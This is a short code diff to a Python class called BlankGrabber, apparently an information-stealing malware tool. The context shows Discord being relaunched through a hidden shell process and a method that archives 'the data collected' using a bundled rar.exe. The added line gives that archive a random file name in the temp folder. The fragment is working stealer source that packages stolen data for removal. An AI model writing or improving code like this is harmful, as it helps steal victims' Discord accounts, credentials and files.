@@ -1520,6 +1520,7 @@ class BlankGrabber:
                                 subprocess.Popen([UpdateEXE, '--processStart', DiscordEXE], shell= True, creationflags= subprocess.CREATE_NEW_CONSOLE | subprocess.SW_HIDE)
     
     def CreateArchive(self) -> tuple[str, str]: # Create archive of the data collected
+        if not self.ArchivePath: self.ArchivePath = os.path.join(os.getenv("temp"), Utility.GetRandomString() + ".zip")
         Logger.info("Creating archive")
         rarPath = os.path.join(sys._MEIPASS, "rar.exe")
         if Utility.GetSelf()[1] or os.path.isfile(rarPath):
